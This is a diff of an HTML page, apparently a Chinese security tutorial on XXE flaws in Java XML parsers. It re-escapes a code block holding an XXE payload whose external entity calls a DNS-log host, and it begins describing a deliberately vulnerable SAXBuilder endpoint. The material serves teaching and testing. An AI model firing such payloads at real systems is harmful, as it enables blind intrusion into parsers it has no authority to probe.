@@ -496,9 +496,9 @@ rg.xml.sax.SAXParseExceptionpublicId</code></pre>
         <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过以下payload，我们可以成功触发XXE漏洞</p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE Drunkbaby [ <!ENTITY xxe SYSTEM "http://i2m2ti.dnslog.cn"> ]>
-<root>&xxe;</root><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE Drunkbaby [ &lt;!ENTITY xxe SYSTEM &quot;http://i2m2ti.dnslog.cn&quot;&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
 <p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221020145201149.png"></p>
 <h3 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h3><p>SAXBuilder是一个JDOM解析器，使用了第三方SAX解析器来处理解析任务，当使用默认的解析方法并且未对XML进行过滤时，就会产生不回显的XXE漏洞。</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">)</span>
